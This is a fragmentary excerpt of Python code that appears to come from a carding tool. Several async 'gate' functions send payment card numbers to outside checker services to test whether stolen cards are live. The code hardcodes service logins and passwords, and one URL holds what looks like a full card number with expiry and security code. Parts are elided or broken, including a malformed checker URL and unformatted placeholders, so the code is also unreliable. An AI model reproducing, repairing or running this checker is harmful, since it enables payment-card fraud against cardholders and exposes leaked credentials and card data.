...
async def confidence(card) -> Tuple[Optional[bool], str]:
    gate = "1"
    user, password = ("Bltore", "Blacks")
    print(f"[GATE_{gate}][{card}] Checking cc...")

    try:
        rt = await hc.get(
            "https://confidencecc.online/client/rest-api/Blacke/store/0/4108639646904134|04|2026|186"
...
async def azkaban(card) -> Tuple[Optional[bool], str]:
    gate = "azkaban"
    user, password = ("md2net", "marcelod2")
    print(f"[GATE_{gate}][{card}] Checking cc...")

    try:
        rt = await hc.get(
            "https://azkabancenter.online/azkabandev.php?usuario=md2net&senha=marcelod2&testador=2-preauth&lista={cc}",
            params=dict(
...
async def azkabanpre(card) -> Tuple[Optional[bool], str]:
    ...
    try:
        rt = await hc.get(
            "https://azkabancenter.online/azkabandev.php?usuario=&senha=&testador=2-preauth&lista={cc}",
            params=dict(
...
async def semchk(card) -> Tuple[Optional[bool], str]:
    ...
    try:
        rt = await hc.get(
            "https://checker.top={card}",
            params=dict(
                lista=card, usuario=user, senha=password, testador="2-zeroauth"
            ),
        )
